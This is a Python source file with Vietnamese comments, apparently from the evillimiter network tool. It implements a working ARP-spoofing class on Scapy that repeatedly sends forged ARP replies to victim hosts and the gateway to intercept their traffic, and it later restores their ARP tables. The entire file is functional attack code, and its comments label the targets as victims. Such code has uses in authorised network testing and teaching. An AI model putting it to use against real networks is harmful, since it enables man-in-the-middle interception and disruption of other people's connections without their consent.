import time
import threading
import logging
from typing import Set, List, Optional

# Scapy imports
# Import thêm Ether và sendp để xử lý gói tin ở Layer 2 (Ethernet)
from scapy.all import Ether, ARP, sendp  # pylint: disable=no-name-in-module

# Giả định các module import từ project của bạn vẫn giữ nguyên
from .host import Host
from evillimiter.common.globals import BROADCAST

# Cấu hình logging cơ bản
logger = logging.getLogger(__name__)

class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str, gateway_mac: str, interval: float = 2.0):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval

        self._hosts: Set[Host] = set()
        self._hosts_lock = threading.Lock()
        
        # Sử dụng Event để quản lý việc dừng thread thông minh hơn
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def add(self, host: Host) -> None:
        """Thêm host vào danh sách spoofing."""
        with self._hosts_lock:
            self._hosts.add(host)
        host.spoofed = True
        logger.debug(f"Added host {host.ip} to spoof list.")

    def remove(self, host: Host, restore: bool = True) -> None:
        """Xóa host và khôi phục ARP table nếu cần."""
        with self._hosts_lock:
            self._hosts.discard(host)

        host.spoofed = False
        
        if restore:
            self._restore(host)
            logger.debug(f"Removed and restored host {host.ip}.")
        else:
            logger.debug(f"Removed host {host.ip} without restore.")

    def start(self) -> None:
        """Bắt đầu luồng spoofing."""
        if self._thread and self._thread.is_alive():
            return

        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True, name="ARPSpooferThread")
        self._thread.start()
        logger.info("ARP Spoofer started.")

    def stop(self) -> None:
        """Dừng luồng spoofing ngay lập tức."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=1.0)
        logger.info("ARP Spoofer stopped.")

    def _spoof_loop(self) -> None:
        """Vòng lặp chính gửi gói tin ARP giả mạo."""
        while not self._stop_event.is_set():
            with self._hosts_lock:
                # Copy nhanh danh sách để giải phóng lock sớm nhất có thể
                current_hosts = list(self._hosts)
            
            if not current_hosts:
                # Nếu không có host nào, đợi interval rồi check lại
                self._stop_event.wait(self.interval)
                continue

            # Xây dựng danh sách tất cả các gói tin cần gửi
            all_packets = []
            for host in current_hosts:
                # Chỉ tạo gói tin nếu host có MAC hợp lệ để tránh lỗi
                if host.mac:
                    packets = self._create_spoof_packets(host)
                    all_packets.extend(packets)

            # Gửi tất cả gói tin (Batch sending)
            if all_packets:
                try:
                    # SỬ DỤNG sendp (Layer 2) thay vì send (Layer 3)
                    sendp(all_packets, verbose=False, iface=self.interface)
                except Exception as e:
                    logger.error(f"Error sending spoof packets: {e}")

            # Wait thông minh: Ngủ `interval` giây, nhưng sẽ tỉnh dậy NGAY LẬP TỨC nếu hàm stop() được gọi
            self._stop_event.wait(self.interval)

    def _create_spoof_packets(self, host: Host) -> List[Ether]:
        """
        Tạo gói tin ARP giả mạo đóng gói trong Ethernet Frame.
        Điều này sửa lỗi warning "You should be providing the Ethernet destination MAC address".
        """
        # Gói 1: Gửi tới Nạn nhân (Victim)
        # Nội dung: "Này Victim, tôi (Attacker MAC) chính là Gateway (Gateway IP)"
        # Đích đến Ethernet: MAC của Victim
        pkt_to_victim = Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac)

        # Gói 2: Gửi tới Gateway (Router)
        # Nội dung: "Này Router, tôi (Attacker MAC) chính là Victim (Victim IP)"
        # Đích đến Ethernet: MAC của Gateway
        pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

        return [pkt_to_victim, pkt_to_gateway]

    def _restore(self, host: Host) -> None:
        """Khôi phục bảng ARP về trạng thái đúng."""
        # Nếu không có MAC thì không thể gửi gói tin Layer 2 chính xác
        if not host.mac:
            return

        logger.info(f"Restoring ARP table for {host.ip}...")
        
        # Tạo gói tin Restore chuẩn, gửi Broadcast để mọi thiết bị cập nhật cache nhanh chóng
        packets = [
            # Nói với mạng: "Gateway IP thực sự ở Gateway MAC"
            Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST),
            # Nói với mạng: "Host IP thực sự ở Host MAC"
            Ether(dst=BROADCAST) / ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST)
        ]
        
        try:
            # Gửi count=3 để đảm bảo gói tin đến nơi (UDP/ARP không tin cậy)
            # Dùng sendp vì đã đóng gói Ether
            for pkt in packets:
                sendp(pkt, verbose=False, iface=self.interface, count=3)
        except Exception as e:
            logger.error(f"Error restoring host {host.ip}: {e}")

    # Hỗ trợ Context Manager (with ARPSpoofer(...) as spoofer:)
    def __enter__(self):
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()